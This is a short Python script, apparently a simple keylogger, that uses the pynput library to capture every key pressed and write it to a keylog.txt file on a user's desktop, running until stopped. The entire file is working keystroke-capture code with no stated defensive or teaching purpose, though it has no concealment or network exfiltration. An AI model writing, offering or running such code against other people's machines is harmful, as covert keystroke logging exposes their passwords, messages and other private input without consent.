from pynput.keyboard import Key, Listener
import logging
 
log_directory = r"C:/users/johan godinho/desktop/"
 
logging.basicConfig(filename = (log_directory+"keylog.txt"), level = logging.DEBUG)
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press = on_press) as listener:
    listener.join()
